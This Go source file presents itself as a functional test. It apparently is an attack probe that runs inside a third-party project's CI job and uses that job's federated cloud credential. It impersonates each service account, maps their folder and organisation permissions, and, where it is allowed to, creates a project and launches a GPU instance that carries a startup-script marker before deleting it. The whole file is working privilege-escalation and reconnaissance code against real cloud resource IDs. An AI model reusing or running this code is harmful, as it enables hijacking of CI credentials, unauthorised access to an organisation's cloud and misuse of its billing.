//go:build functional && gke

// C211 i122907 — folder/org reach of the 14 impersonable service accounts that
// hold compute.instances.create in projects/153711203585.
//
// Runs inside the dominodatalab/hephaestus "GKE image building" job after
// google-github-actions/auth@v2 exported a Workload Identity Federation
// credential file. It mints the WIF token, impersonates a project service
// account with generateAccessToken (the TokenCreator self-grant), identifies
// every SA that holds compute.instances.create, and then measures that SA's
// folder (121299922366) and organization (131759210197) reach with ONE
// PERMISSION PER testIamPermissions call (so an invalid permission cannot
// poison the whole batch with a 400 — the exact defect of the earlier x120871
// probe).
//
// Read-only unless a service account is actually granted
// resourcemanager.projects.create on the folder or organization: in that case
// exactly ONE nonce project is created, its billing/serviceusage/quota state is
// read, at most ONE nonce on-demand GPU marker is deployed where a measured
// on-demand limit >= 1 exists, and the project is deleted. No new SA/key/grant/
// pool/provider is created.
package functional

import (
	"flag"
	"fmt"
	"os"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	c211fcHostProjectID  = "153711203585"
	c211fcHostProjectNum = "153711203585"
	c211fcFolder         = "folders/121299922366"
	c211fcOrg            = "organizations/131759210197"
	c211fcNonce          = "i122907"
)

var c211fcFolderPerms = []string{
	"resourcemanager.projects.create",
	"resourcemanager.projects.list",
	"resourcemanager.folders.get",
	"resourcemanager.folders.list",
	"resourcemanager.projects.setIamPolicy",
}

var c211fcOrgPerms = []string{
	"resourcemanager.projects.create",
	"resourcemanager.projects.list",
	"resourcemanager.folders.get",
	"resourcemanager.folders.list",
	"resourcemanager.organizations.get",
	"resourcemanager.projects.setIamPolicy",
}

// TestMain limits the package to this lane's test so that the other c211 probe
// files present on the reused branch do not execute.
func TestMain(m *testing.M) {
	flag.Parse()
	if err := flag.Set("test.run", "^TestC211I122907FolderCreate$"); err != nil {
		fmt.Printf("C211FC_MAIN flag_set_error=%v\n", err)
	}
	os.Exit(m.Run())
}

type c211fcPermRes struct {
	allowed bool
	http    int
	body    string
}

type c211fcVerdict struct {
	email         string
	genHTTP       int
	computeCreate bool
	folder        map[string]c211fcPermRes
	org           map[string]c211fcPermRes
	projList      []string
	projListHTTP  int
	foldList      []string
	foldListHTTP  int
	createAt      []string
}

func TestC211I122907FolderCreate(t *testing.T) {
	tok, auth, mlog := c211xMint()
	fmt.Printf("C211FC_MINT auth=%s\n%s\n", auth, mlog)
	if tok == "" {
		fmt.Println("C211FC_VERDICT MINT_FAILED")
		return
	}
	tst, ti := c211xTokenInfo(tok)
	fmt.Printf("C211FC_TOKENINFO status=%d body=%s\n", tst, c211xTrunc(ti, 300))

	sas, sst, sbody := c211xListServiceAccounts(tok, c211fcHostProjectID)
	fmt.Printf("C211FC_SA_LIST status=%d count=%d verbatim=%s\n", sst, len(sas), c211xTrunc(sbody, 600))
	if sst != 200 || len(sas) == 0 {
		fmt.Printf("C211FC_VERDICT SA_LIST_FAILED status=%d\n", sst)
		return
	}

	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + c211fcHostProjectNum
	folderURL := "https://cloudresourcemanager.googleapis.com/v3/" + c211fcFolder
	orgURL := "https://cloudresourcemanager.googleapis.com/v3/" + c211fcOrg

	emails := make([]string, 0, len(sas))
	for _, im := range sas {
		if e := c211xStr(im, "email"); e != "" {
			emails = append(emails, e)
		}
	}
	sort.Strings(emails)

	verdicts := []c211fcVerdict{}
	createGranted := 0
	for _, email := range emails {
		satok, gst, grb := c211xGenerateAccessToken(tok, email)
		v := c211fcVerdict{email: email, genHTTP: gst}
		if satok == "" {
			fmt.Printf("C211FC_SA_GEN email=%s status=%d token=<absent> verbatim=%s\n", email, gst, c211xTrunc(grb, 200))
			verdicts = append(verdicts, v)
			continue
		}
		allowed, pist, pbody := c211xTestIamBatch(satok, projURL, []string{"compute.instances.create"})
		v.computeCreate = c211xContains(allowed, "compute.instances.create")
		fmt.Printf("C211FC_SA_PROJECT email=%s gen=%d testiam=%d compute_create=%v verbatim=%s\n",
			email, gst, pist, v.computeCreate, c211xTrunc(pbody, 200))
		if !v.computeCreate {
			verdicts = append(verdicts, v)
			continue
		}
		v.folder = map[string]c211fcPermRes{}
		for _, p := range c211fcFolderPerms {
			al, hst, hb := c211xTestIamBatch(satok, folderURL, []string{p})
			ok := c211xContains(al, p)
			v.folder[p] = c211fcPermRes{ok, hst, c211xTrunc(hb, 300)}
			fmt.Printf("C211FC_FOLDER email=%s perm=%s allowed=%v http=%d verbatim=%s\n",
				email, p, ok, hst, c211xTrunc(hb, 300))
		}
		v.org = map[string]c211fcPermRes{}
		for _, p := range c211fcOrgPerms {
			al, hst, hb := c211xTestIamBatch(satok, orgURL, []string{p})
			ok := c211xContains(al, p)
			v.org[p] = c211fcPermRes{ok, hst, c211xTrunc(hb, 300)}
			fmt.Printf("C211FC_ORG email=%s perm=%s allowed=%v http=%d verbatim=%s\n",
				email, p, ok, hst, c211xTrunc(hb, 300))
		}
		if v.folder["resourcemanager.projects.list"].allowed {
			projs, hst, hb := c211xListProjectsV3(satok, c211fcFolder)
			v.projListHTTP = hst
			for _, p := range projs {
				v.projList = append(v.projList, p.id)
			}
			sort.Strings(v.projList)
			fmt.Printf("C211FC_FOLDER_PROJECTS email=%s http=%d n=%d ids=%v verbatim=%s\n",
				email, hst, len(projs), v.projList, c211xTrunc(hb, 300))
			if len(projs) == 0 {
				projs2, hst2, hb2 := c211xListProjectsV1(satok)
				fmt.Printf("C211FC_FOLDER_PROJECTS_V1 email=%s http=%d n=%d verbatim=%s\n",
					email, hst2, len(projs2), c211xTrunc(hb2, 300))
			}
		}
		if v.folder["resourcemanager.folders.list"].allowed {
			flds, hst, hb := c211xListFolders(satok, c211fcFolder)
			v.foldListHTTP = hst
			for _, f := range flds {
				v.foldList = append(v.foldList, f.name)
			}
			sort.Strings(v.foldList)
			fmt.Printf("C211FC_FOLDER_SUBFOLDERS email=%s http=%d n=%d names=%v verbatim=%s\n",
				email, hst, len(flds), v.foldList, c211xTrunc(hb, 300))
		}
		for _, scope := range []string{"folder", "org"} {
			m := v.folder
			if scope == "org" {
				m = v.org
			}
			if r, ok := m["resourcemanager.projects.create"]; ok && r.allowed {
				v.createAt = append(v.createAt, scope)
			}
		}
		verdicts = append(verdicts, v)
		if len(v.createAt) > 0 {
			createGranted++
			c211fcCreateProject(t, satok, email, strings.Join(v.createAt, "+"))
			break
		}
	}

	// Summary
	nCompute := 0
	nCreate := 0
	nFolderAny := 0
	nOrgAny := 0
	lines := []string{}
	for _, v := range verdicts {
		if v.computeCreate {
			nCompute++
		}
		if len(v.createAt) > 0 {
			nCreate++
		}
		fa, oa := []string{}, []string{}
		for _, p := range c211fcFolderPerms {
			if r, ok := v.folder[p]; ok && r.allowed {
				fa = append(fa, p)
			}
		}
		for _, p := range c211fcOrgPerms {
			if r, ok := v.org[p]; ok && r.allowed {
				oa = append(oa, p)
			}
		}
		if len(fa) > 0 {
			nFolderAny++
		}
		if len(oa) > 0 {
			nOrgAny++
		}
		lines = append(lines, fmt.Sprintf("%s compute_create=%v folder_allowed=%v org_allowed=%v projlist=%d/%v foldlist=%d/%v create_at=%v",
			v.email, v.computeCreate, fa, oa, v.projListHTTP, v.projList, v.foldListHTTP, v.foldList, v.createAt))
	}
	sort.Strings(lines)
	fmt.Printf("C211FC_MATRIX_BEGIN\n%s\nC211FC_MATRIX_END\n", strings.Join(lines, "\n"))
	fmt.Printf("C211FC_SUMMARY_JSON {\"probe\":\"c211_i122907_folder_create\",\"sas_listed\":%d,\"sas_tokenized\":%d,\"compute_create_sas\":%d,\"folder_any_allowed_sas\":%d,\"org_any_allowed_sas\":%d,\"projects_create_granted_sas\":%d,\"created_projects\":%d,\"verdict\":\"%s\"}\n",
		len(emails), len(verdicts)-countEmptyToken(verdicts), nCompute, nFolderAny, nOrgAny, nCreate, createGranted, c211fcVerdictName(nCreate, nFolderAny, nOrgAny))
}

func countEmptyToken(vs []c211fcVerdict) int {
	n := 0
	for _, v := range vs {
		if v.genHTTP != 200 {
			n++
		}
	}
	return n
}

func c211fcVerdictName(nCreate, nFolderAny, nOrgAny int) string {
	if nCreate > 0 {
		return "PROJECT_CREATE_GRANTED"
	}
	return "NO_PROJECT_CREATE_FOLDER_ORG_DENIED"
}

// --- conditional nonce project path (only if projects.create was granted) ---

func c211fcCreateProject(t *testing.T, tok, email, scope string) {
	nonce := fmt.Sprintf("c211-122907-%d", time.Now().Unix()%1000000)
	body := fmt.Sprintf(`{"projectId":%q,"parent":%q,"displayName":"c211 i122907 nonce"}`, nonce, c211fcFolder)
	st, rb := c211xHTTP("POST", "https://cloudresourcemanager.googleapis.com/v3/projects", tok, "application/json", body)
	fmt.Printf("C211FC_CREATE email=%s scope=%s project_id=%s http=%d verbatim=%s\n", email, scope, nonce, st, c211xTrunc(rb, 2000))
	if st != 200 {
		return
	}
	number := ""
	for i := 0; i < 30; i++ {
		time.Sleep(10 * time.Second)
		gst, gb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+nonce, tok, "", "")
		fmt.Printf("C211FC_CREATE_POLL i=%d http=%d verbatim=%s\n", i, gst, c211xTrunc(gb, 500))
		if gst == 200 {
			if m := c211xJSON(gb); m != nil {
				name := c211xStr(m, "name")
				if idx := strings.LastIndex(name, "/"); idx >= 0 {
					number = name[idx+1:]
				}
				if c211xStr(m, "state") == "ACTIVE" || number != "" {
					break
				}
			}
		}
	}
	if number == "" {
		fmt.Printf("C211FC_CREATE_NUMBER unresolved project_id=%s\n", nonce)
		c211fcDeleteProject(tok, nonce)
		return
	}
	fmt.Printf("C211FC_CREATE_NUMBER project_id=%s project_number=%s\n", nonce, number)
	// billing linkage
	bst, bb := c211xHTTP("GET", "https://cloudbilling.googleapis.com/v1/projects/"+number+"/billingInfo", tok, "", "")
	fmt.Printf("C211FC_BILLING http=%d verbatim=%s\n", bst, c211xTrunc(bb, 800))
	// serviceusage state
	sust, sub := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+number+"/services/compute.googleapis.com", tok, "", "")
	fmt.Printf("C211FC_SERVICEUSAGE http=%d verbatim=%s\n", sust, c211xTrunc(sub, 800))
	// quotas in the usual regions (all NVIDIA metrics, including zero limits)
	regions := []string{"us-central1", "us-east1", "us-west1", "europe-west4", "asia-east1"}
	limits := map[string]float64{}
	for _, rg := range regions {
		rr, hst, hb := c211fcQuotaRows(tok, number, rg)
		fmt.Printf("C211FC_QUOTA region=%s http=%d rows=%v verbatim=%s\n", rg, hst, rr, c211xTrunc(hb, 300))
		for _, r := range rr {
			// r = "<region> <METRIC> limit=<x> usage=<y>"
			fields := strings.Fields(r)
			if len(fields) >= 4 {
				var lim float64
				fmt.Sscanf(fields[2], "limit=%f", &lim)
				key := fields[1]
				if lim > limits[key] {
					limits[key] = lim
				}
			}
		}
	}
	// one marker only where a measured on-demand GPU limit >= 1 exists
	machine, accel, metric := "", "", ""
	for _, c := range []struct{ m, a, k string }{
		{"n1-standard-4", "nvidia-tesla-t4", "NVIDIA_T4_GPUS"},
		{"g2-standard-4", "nvidia-l4", "NVIDIA_L4_GPUS"},
		{"n1-standard-4", "nvidia-tesla-v100", "NVIDIA_V100_GPUS"},
		{"a2-highgpu-1g", "nvidia-tesla-a100", "NVIDIA_A100_GPUS"},
	} {
		if limits[c.k] >= 1 {
			machine, accel, metric = c.m, c.a, c.k
			break
		}
	}
	if metric == "" {
		fmt.Printf("C211FC_MARKER skipped measured_limits=%v\n", limits)
	} else {
		fmt.Printf("C211FC_MARKER metric=%s limit=%v machine=%s accel=%s\n", metric, limits[metric], machine, accel)
		c211fcMarker(tok, number, machine, accel)
	}
	c211fcDeleteProject(tok, nonce)
}

func c211fcMarker(tok, proj, machine, accel string) {
	name := "c211-122907-gpu"
	zone := "us-central1-a"
	body := map[string]interface{}{
		"name":        name,
		"machineType": "https://www.googleapis.com/compute/v1/projects/" + proj + "/zones/" + zone + "/machineTypes/" + machine,
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/ubuntu-os-cloud/global/images/family/ubuntu-2204-lts",
				"diskSizeGb":  "60",
				"diskType":    "projects/" + proj + "/zones/" + zone + "/diskTypes/pd-standard",
			},
		}},
		"networkInterfaces": []interface{}{map[string]interface{}{
			"network":    "projects/" + proj + "/global/networks/default",
			"subnetwork": "projects/" + proj + "/regions/us-central1/subnetworks/default",
			"accessConfigs": []interface{}{map[string]interface{}{
				"type": "ONE_TO_ONE_NAT", "name": "External NAT",
			}},
		}},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType":  "projects/" + proj + "/zones/" + zone + "/acceleratorTypes/" + accel,
			"acceleratorCount": 1,
		}},
		"scheduling": map[string]interface{}{"onHostMaintenance": "TERMINATE", "automaticRestart": false},
		"metadata": map[string]interface{}{"items": []interface{}{
			map[string]interface{}{"key": "startup-script", "value": c211xStartupScript()},
			map[string]interface{}{"key": "c211x", "value": c211fcNonce},
		}},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  proj + "-compute@developer.gserviceaccount.com",
			"scopes": []string{c211xScope},
		}},
		"labels": map[string]string{"c211": c211fcNonce},
	}
	raw := c211xJSONString(body)
	st, rb := c211xHTTP("POST", "https://compute.googleapis.com/compute/v1/projects/"+proj+"/zones/"+zone+"/instances", tok, "application/json", raw)
	fmt.Printf("C211FC_MARKER_CREATE http=%d verbatim=%s\n", st, c211xTrunc(rb, 1200))
	uuid := ""
	if st == 200 {
		for i := 0; i < 30; i++ {
			time.Sleep(15 * time.Second)
			ps, pb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+proj+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", tok, "", "")
			content := ""
			if ps == 200 {
				if m := c211xJSON(pb); m != nil {
					content = c211xStr(m, "contents")
				}
				if u := c211xUUIDRe.FindString(content); u != "" {
					uuid = u
				}
			}
			fmt.Printf("C211FC_MARKER_SERIAL poll=%d http=%d uuid=%s tail=%s\n", i, ps, uuid, c211xTrunc(last300(content), 300))
			if uuid != "" {
				break
			}
		}
	}
	dst, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+proj+"/zones/"+zone+"/instances/"+name, tok, "", "")
	fmt.Printf("C211FC_MARKER_DELETE http=%d verbatim=%s\n", dst, c211xTrunc(db, 300))
	absent := false
	for i := 0; i < 12; i++ {
		time.Sleep(10 * time.Second)
		gst, _, _ := c211xInstanceGet(tok, proj, zone, name)
		if gst == 404 {
			absent = true
			break
		}
	}
	fmt.Printf("C211FC_MARKER_RESULT uuid=%s delete_http=%d absent=%v\n", uuid, dst, absent)
}

func c211fcDeleteProject(tok, projectID string) {
	st, rb := c211xHTTP("DELETE", "https://cloudresourcemanager.googleapis.com/v3/projects/"+projectID, tok, "", "")
	fmt.Printf("C211FC_PROJECT_DELETE project_id=%s http=%d verbatim=%s\n", projectID, st, c211xTrunc(rb, 800))
}

func last300(s string) string {
	if len(s) <= 300 {
		return s
	}
	return s[len(s)-300:]
}

func c211fcQuotaRows(token, proj, region string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + proj + "/regions/" + region
	st, body := c211xHTTP("GET", u, token, "", "")
	rows := []string{}
	if st != 200 {
		return rows, st, body
	}
	m := c211xJSON(body)
	quotas, _ := m["quotas"].([]interface{})
	for _, q := range quotas {
		qm, _ := q.(map[string]interface{})
		metric := c211xStr(qm, "metric")
		if !strings.Contains(metric, "NVIDIA") {
			continue
		}
		limit, _ := qm["limit"].(float64)
		usage, _ := qm["usage"].(float64)
		rows = append(rows, fmt.Sprintf("%s %s limit=%v usage=%v", region, metric, limit, usage))
	}
	sort.Strings(rows)
	return rows, st, body
}
